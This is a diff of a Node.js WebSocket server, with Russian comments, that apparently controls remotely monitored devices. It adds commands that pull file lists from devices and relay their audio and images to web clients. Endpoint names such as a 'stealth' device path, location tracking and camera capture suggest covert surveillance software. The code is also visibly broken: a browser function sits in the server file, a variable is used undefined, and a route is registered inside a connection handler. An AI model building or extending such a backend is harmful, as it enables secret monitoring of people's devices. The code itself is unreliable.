@@ -63,6 +63,15 @@ server.on("upgrade", (request, socket, head) => {
   }
 });
 
+// В веб-интерфейсе добавьте кнопку:
+function requestFileList() {
+    if (deviceWebSocket && deviceWebSocket.readyState === WebSocket.OPEN) {
+        deviceWebSocket.send(JSON.stringify({
+            action: 'GET_FILES'
+        }));
+    }
+}
+
 // Helper: broadcast object message to all web clients (JSON)
 function broadcastToWebClients(obj) {
   const payload = JSON.stringify(obj);
@@ -129,25 +138,62 @@ wss.on("connection", (ws, req) => {
     console.log(`Web client connected. Total: ${webClients.size}`);
 
     // В обработчике WebSocket сообщений:
+// Обработка WebSocket сообщений
 ws.on('message', (message) => {
     try {
         const data = JSON.parse(message);
         
-        if (data.type === 'audio') {
-            // Передаем всем подключенным клиентам
+        if (data.type === 'file_list') {
+            // Сохраняем список файлов для устройства
+            devices.set(deviceId, {
+                ...devices.get(deviceId),
+                files: data.files,
+                lastFileUpdate: Date.now()
+            });
+            
+            console.log(`Received ${data.files.length} files from ${deviceId}`);
+            
+            // Отправляем обновление всем подключенным клиентам
             wss.clients.forEach(client => {
                 if (client !== ws && client.readyState === WebSocket.OPEN) {
                     client.send(JSON.stringify({
-                        type: 'audio',
+                        type: 'file_list',
                         deviceId: deviceId,
-                        data: data.data,
-                        timestamp: data.timestamp
+                        files: data.files
                     }));
+                }
+            });
+        }
+        else if (data.type === 'image') {
+            // Пересылаем изображение
+            wss.clients.forEach(client => {
+                if (client !== ws && client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify(data));
+                }
+            });
+        }
+        else if (data.type === 'audio') {
+            // Пересылаем аудио
+            wss.clients.forEach(client => {
+                if (client !== ws && client.readyState === WebSocket.OPEN) {
+                    client.send(JSON.stringify(data));
                 }
             });
         }
     } catch (e) {
         console.error('Message parse error:', e);
+    }
+});
+
+// API для получения списка файлов
+app.get('/api/files/:deviceId', (req, res) => {
+    const { deviceId } = req.params;
+    const device = devices.get(deviceId);
+    
+    if (device && device.files) {
+        res.json({ files: device.files });
+    } else {
+        res.json({ files: [] });
     }
 });
 
@@ -166,8 +212,6 @@ ws.on('message', (message) => {
 wss.on("error", (err) => {
   console.error("WebSocket server error:", err);
 });
-
-// ===== API endpoints (full) =====
 
 // ===== API endpoints (full) =====
 
@@ -477,6 +521,7 @@ server.listen(PORT, () => {
   console.log("- Legacy devices path: ws://host/ws/stealth/SYS123");
   console.log("Available endpoints: /api/login, /api/location, /api/camera/image, /api/devices/:token, etc.");
 });
+
 
 
 
